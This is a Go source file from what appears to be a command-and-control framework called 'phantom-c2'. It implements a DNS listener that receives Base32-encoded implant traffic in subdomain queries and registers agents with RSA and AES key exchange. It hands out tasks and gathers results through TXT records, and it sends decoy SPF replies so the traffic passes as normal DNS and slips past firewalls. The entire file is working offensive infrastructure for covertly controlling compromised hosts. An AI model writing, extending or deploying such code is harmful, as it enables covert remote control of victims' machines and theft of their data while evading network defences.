package listener

import (
	"crypto/rsa"
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/phantom-c2/phantom/internal/agent"
	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/task"
)

// DNSListener handles C2 communications over DNS TXT/CNAME queries.
// Traffic appears as normal DNS lookups, bypassing most firewalls and proxies.
//
// Protocol:
//   Check-in:  <encoded-data>.<session-id>.c2domain.com → TXT record response
//   Data xfer: Split across multiple queries with sequence numbers
//   Encoding:  Base32 in subdomains (DNS-safe), Base64 in TXT responses

const (
	dnsMaxLabelLen   = 63   // Max DNS label length
	dnsMaxSubdomains = 4    // Max data labels per query
	dnsTXTMaxLen     = 255  // Max TXT record length
	dnsBufferTimeout = 30 * time.Second
)

// DNSListener implements a DNS-based C2 listener.
type DNSListener struct {
	ID       string
	Name     string
	BindAddr string // e.g., "0.0.0.0:53"
	Domain   string // e.g., "c2.example.com"

	conn     *net.UDPConn
	privKey  *rsa.PrivateKey
	agentMgr *agent.Manager
	taskDisp *task.Dispatcher
	onEvent  EventCallback
	running  bool

	// Reassembly buffers for multi-packet messages
	mu       sync.Mutex
	buffers  map[string]*dnsBuffer
}

// dnsBuffer holds partial data from multi-query transmissions.
type dnsBuffer struct {
	chunks    map[int][]byte
	total     int
	lastSeen  time.Time
	sessionID string
}

// DNSListenerConfig holds DNS listener configuration.
type DNSListenerConfig struct {
	ID       string
	Name     string
	BindAddr string
	Domain   string
	PrivKey  *rsa.PrivateKey
	AgentMgr *agent.Manager
	TaskDisp *task.Dispatcher
	OnEvent  EventCallback
}

// NewDNSListener creates a new DNS C2 listener.
func NewDNSListener(cfg DNSListenerConfig) *DNSListener {
	return &DNSListener{
		ID:       cfg.ID,
		Name:     cfg.Name,
		BindAddr: cfg.BindAddr,
		Domain:   cfg.Domain,
		privKey:  cfg.PrivKey,
		agentMgr: cfg.AgentMgr,
		taskDisp: cfg.TaskDisp,
		onEvent:  cfg.OnEvent,
		buffers:  make(map[string]*dnsBuffer),
	}
}

// Start begins listening for DNS queries.
func (l *DNSListener) Start() error {
	addr, err := net.ResolveUDPAddr("udp", l.BindAddr)
	if err != nil {
		return fmt.Errorf("resolve address: %w", err)
	}

	l.conn, err = net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("listen UDP: %w", err)
	}

	l.running = true
	l.emitEvent("listener_start", l.Name, "dns", l.BindAddr)

	// Start buffer cleanup goroutine
	go l.cleanupBuffers()

	// Main receive loop
	buf := make([]byte, 512) // Standard DNS packet max
	for l.running {
		n, remoteAddr, err := l.conn.ReadFromUDP(buf)
		if err != nil {
			if l.running {
				continue
			}
			break
		}

		go l.handleQuery(buf[:n], remoteAddr)
	}

	return nil
}

// Stop shuts down the DNS listener.
func (l *DNSListener) Stop() error {
	l.running = false
	if l.conn != nil {
		return l.conn.Close()
	}
	return nil
}

// IsRunning returns whether the listener is active.
func (l *DNSListener) IsRunning() bool {
	return l.running
}

// handleQuery processes a DNS query and generates a response.
func (l *DNSListener) handleQuery(data []byte, addr *net.UDPAddr) {
	// Parse DNS header (minimal parser)
	if len(data) < 12 {
		return
	}

	txnID := binary.BigEndian.Uint16(data[0:2])
	qdCount := binary.BigEndian.Uint16(data[4:6])
	if qdCount == 0 {
		return
	}

	// Parse question section
	qname, _, offset := parseDNSQuestion(data, 12)
	if qname == "" {
		return
	}

	// Check if query is for our domain
	if !strings.HasSuffix(strings.ToLower(qname), "."+strings.ToLower(l.Domain)) {
		// Not our domain — respond with NXDOMAIN
		l.sendDNSResponse(addr, txnID, data[:offset], nil, 3) // RCODE=NXDOMAIN
		return
	}

	// Extract encoded data from subdomain labels
	subdomain := strings.TrimSuffix(strings.ToLower(qname), "."+strings.ToLower(l.Domain))
	parts := strings.Split(subdomain, ".")

	if len(parts) == 0 {
		l.sendDNSResponse(addr, txnID, data[:offset], nil, 0)
		return
	}

	// Decode the C2 data from subdomain labels
	encoded := strings.Join(parts, "")
	encoded = strings.ToUpper(encoded) // Base32 is uppercase

	decoded, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(encoded)
	if err != nil {
		// Not a C2 query — send benign TXT response
		l.sendDNSTXT(addr, txnID, data[:offset], qname, "v=spf1 -all")
		return
	}

	// Process the C2 message
	responseData := l.processC2Data(decoded, addr.IP.String())

	// Encode response as Base64 in TXT record
	if responseData != nil {
		encoded := crypto.Base64Encode(responseData)
		l.sendDNSTXT(addr, txnID, data[:offset], qname, encoded)
	} else {
		l.sendDNSTXT(addr, txnID, data[:offset], qname, "")
	}
}

// processC2Data handles decoded C2 messages from DNS queries.
func (l *DNSListener) processC2Data(data []byte, sourceIP string) []byte {
	if len(data) < 2 {
		return nil
	}

	msgType := data[0]

	switch msgType {
	case protocol.MsgRegisterRequest:
		return l.handleDNSRegistration(data[1:], sourceIP)
	case protocol.MsgCheckIn:
		return l.handleDNSCheckIn(data[1:])
	default:
		return nil
	}
}

// handleDNSRegistration processes agent registration over DNS.
func (l *DNSListener) handleDNSRegistration(data []byte, sourceIP string) []byte {
	// RSA decrypt to get session key + registration payload
	sessionKey, regPayload, err := crypto.UnpackKeyExchange(l.privKey, data)
	if err != nil {
		return nil
	}

	var regReq protocol.RegisterRequest
	if err := protocol.Unmarshal(regPayload, &regReq); err != nil {
		return nil
	}

	agentRecord, err := l.agentMgr.Register(&regReq, sessionKey, sourceIP, l.ID)
	if err != nil {
		return nil
	}

	l.emitEvent("agent_register", agentRecord.Name, agentRecord.OS, agentRecord.Hostname, agentRecord.Username, sourceIP)

	// Build encrypted response
	regResp := protocol.RegisterResponse{
		AgentID: agentRecord.ID,
		Name:    agentRecord.Name,
		Sleep:   agentRecord.Sleep,
		Jitter:  agentRecord.Jitter,
	}

	respPayload, _ := protocol.Marshal(regResp)
	encrypted, _ := crypto.AESEncrypt(sessionKey, respPayload)

	// Prepend message type
	return append([]byte{protocol.MsgRegisterResponse}, encrypted...)
}

// handleDNSCheckIn processes agent check-ins over DNS.
func (l *DNSListener) handleDNSCheckIn(data []byte) []byte {
	if len(data) < 9 {
		return nil
	}

	// Extract KeyID (first 8 bytes)
	var keyID [8]byte
	copy(keyID[:], data[:8])

	agentID, sessionKey, found := l.agentMgr.FindAgentByKeyID(keyID)
	if !found {
		return nil
	}

	// Decrypt the rest
	plaintext, err := crypto.AESDecrypt(sessionKey, data[8:])
	if err != nil {
		return nil
	}

	var checkIn protocol.CheckInRequest
	if err := protocol.Unmarshal(plaintext, &checkIn); err != nil {
		return nil
	}

	l.agentMgr.CheckIn(agentID)

	// Process results
	for _, result := range checkIn.Results {
		result.AgentID = agentID
		l.taskDisp.ProcessResult(&result)
		l.emitEvent("task_result", agentID, result.TaskID)
	}

	// Get pending tasks
	tasks, _ := l.taskDisp.GetPendingTasks(agentID)
	resp := protocol.CheckInResponse{Tasks: tasks}
	respPayload, _ := protocol.Marshal(resp)
	encrypted, _ := crypto.AESEncrypt(sessionKey, respPayload)

	return append([]byte{protocol.MsgCheckInResponse}, encrypted...)
}

// ════════════════════════════════════════════════════════
//  DNS PACKET BUILDERS
// ════════════════════════════════════════════════════════

// sendDNSResponse sends a raw DNS response.
func (l *DNSListener) sendDNSResponse(addr *net.UDPAddr, txnID uint16, question []byte, answer []byte, rcode byte) {
	// Build response header
	resp := make([]byte, 0, 512)

	// Transaction ID
	resp = append(resp, byte(txnID>>8), byte(txnID))

	// Flags: QR=1 (response), OPCODE=0, AA=1, TC=0, RD=1, RA=1, RCODE
	resp = append(resp, 0x85, 0x80|rcode)

	// QDCOUNT=1, ANCOUNT, NSCOUNT=0, ARCOUNT=0
	anCount := uint16(0)
	if answer != nil {
		anCount = 1
	}
	resp = append(resp, 0x00, 0x01) // QDCOUNT
	resp = append(resp, byte(anCount>>8), byte(anCount))
	resp = append(resp, 0x00, 0x00, 0x00, 0x00) // NS, AR

	// Question section (echo back)
	resp = append(resp, question[12:]...)

	// Answer section
	if answer != nil {
		resp = append(resp, answer...)
	}

	l.conn.WriteToUDP(resp, addr)
}

// sendDNSTXT sends a DNS TXT record response.
func (l *DNSListener) sendDNSTXT(addr *net.UDPAddr, txnID uint16, question []byte, qname string, txt string) {
	resp := make([]byte, 0, 512)

	// Header
	resp = append(resp, byte(txnID>>8), byte(txnID))
	resp = append(resp, 0x85, 0x80) // QR=1, AA=1, RD=1, RA=1, RCODE=0

	anCount := uint16(0)
	if txt != "" {
		anCount = 1
	}
	resp = append(resp, 0x00, 0x01) // QDCOUNT
	resp = append(resp, byte(anCount>>8), byte(anCount))
	resp = append(resp, 0x00, 0x00, 0x00, 0x00) // NS, AR

	// Question section
	resp = append(resp, question[12:]...)

	// TXT answer
	if txt != "" {
		// Name pointer to question
		resp = append(resp, 0xC0, 0x0C)
		// Type TXT (16)
		resp = append(resp, 0x00, 0x10)
		// Class IN
		resp = append(resp, 0x00, 0x01)
		// TTL (60 seconds)
		resp = append(resp, 0x00, 0x00, 0x00, 0x3C)

		// TXT RDATA
		txtBytes := []byte(txt)
		if len(txtBytes) > dnsTXTMaxLen {
			txtBytes = txtBytes[:dnsTXTMaxLen]
		}
		rdLen := len(txtBytes) + 1 // +1 for TXT length byte
		resp = append(resp, byte(rdLen>>8), byte(rdLen))
		resp = append(resp, byte(len(txtBytes)))
		resp = append(resp, txtBytes...)
	}

	l.conn.WriteToUDP(resp, addr)
}

// parseDNSQuestion extracts the QNAME and QTYPE from a DNS query.
func parseDNSQuestion(data []byte, offset int) (string, uint16, int) {
	var labels []string

	for offset < len(data) {
		length := int(data[offset])
		if length == 0 {
			offset++
			break
		}
		if offset+1+length > len(data) {
			return "", 0, offset
		}
		labels = append(labels, string(data[offset+1:offset+1+length]))
		offset += 1 + length
	}

	qtype := uint16(0)
	if offset+2 <= len(data) {
		qtype = binary.BigEndian.Uint16(data[offset:])
		offset += 4 // QTYPE + QCLASS
	}

	return strings.Join(labels, "."), qtype, offset
}

// cleanupBuffers removes stale reassembly buffers.
func (l *DNSListener) cleanupBuffers() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for l.running {
		<-ticker.C
		l.mu.Lock()
		now := time.Now()
		for k, buf := range l.buffers {
			if now.Sub(buf.lastSeen) > dnsBufferTimeout {
				delete(l.buffers, k)
			}
		}
		l.mu.Unlock()
	}
}

func (l *DNSListener) emitEvent(event string, args ...interface{}) {
	if l.onEvent != nil {
		l.onEvent(event, args...)
	}
}
